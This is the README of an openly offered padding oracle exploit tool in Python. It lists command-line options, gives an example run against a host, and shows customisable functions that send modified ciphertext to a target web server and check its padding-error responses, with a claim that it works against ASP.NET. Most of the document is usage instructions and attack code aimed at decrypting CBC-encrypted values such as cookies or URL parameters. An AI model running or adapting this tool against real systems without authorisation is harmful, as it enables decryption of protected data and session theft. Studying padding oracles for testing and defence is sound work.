# Padding Oracle Attack

An exploit for the [Padding Oracle Attack](http://en.wikipedia.org/wiki/Padding_oracle). Tested against ASP.NET, works like a charm. The CBC  mode must use [PKCS7](https://en.wikipedia.org/wiki/Padding_%28cryptography%29#PKCS7) for the padding block.
This is an implementation of this great article [Padding Oracle Attack](https://not.burntout.org/blog/Padding_Oracle_Attack/). I advise you to read it if you want to understand the basic of the attack.
This exploit allow block size of 8 or 16 this mean it can be use even if the cipher use AES or DES.

## Options

```
usage: exploit.py [-h] -c CIPHER -l LENGTH_BLOCK_CIPHER --host HOST -u
                  URLTARGET --error ERROR [--iv IV] [--cookie COOKIE]
                  [--method METHOD] [--post POST] [-v]
```
Details required options:
```
-h help
-c cipher chain
-l length of a block example: 8 or 16
-u UrlTarget for example: ?/page=
--host hostname example: google.fr
--error Error that the orcale give you for a wrong padding
    example: with HTTP method: 200,400,500
             with DOM HTML   : "<h2>Padding Error</h2>"
```
Optionnal options:
```
--iv The IV of the cipher if you have it, otherwise the first block will not be decipher
--cookie Cookie parameter example: PHPSESSID=9nnvje7p90b507shfmb94d7
--method Default GET methode but can se POST etc
--post POST parameter if you need example 'user':'value', 'pass':'value'
```

Example:
```
python exploit.py -c E3B3D1120F999F4CEF945BA8B9326D7C3C8A8B02178E59AF506666542AB5EF44 -l 16 --host host.com -u /index.aspx?c= -v --error "Padding Error"
```

## Customisation

> I wan to custom the Oracle !

No problem, find these line and do what you have to do :)

* Custom oracle response: 
```
####################################
# CUSTOM YOUR RESPONSE ORACLE HERE #
####################################
''' the function you want change to adapte the result to your problem '''
def test_validity(response,error):
    try:
        value = int(error)
        if int(response.status) == value:
            return 1
    except ValueError:
        pass  # it was a string, not an int.

    # oracle repsonse with data in the DOM
    data = response.read()
    if data.find(error) == -1:
        return 1
    return 0
```

* Custom oracle call (HTTP)
```
################################
# CUSTOM YOUR ORACLE HTTP HERE #
################################
def call_oracle(host,cookie,url,post,method,up_cipher):
    if post:
        params = urllib.urlencode({post})
    else:
        params = urllib.urlencode({})
    headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain", 'Cookie': cookie}
    conn = httplib.HTTPConnection(host)
    conn.request(method, url + up_cipher, params, headers)
    response = conn.getresponse()
    return conn, response
```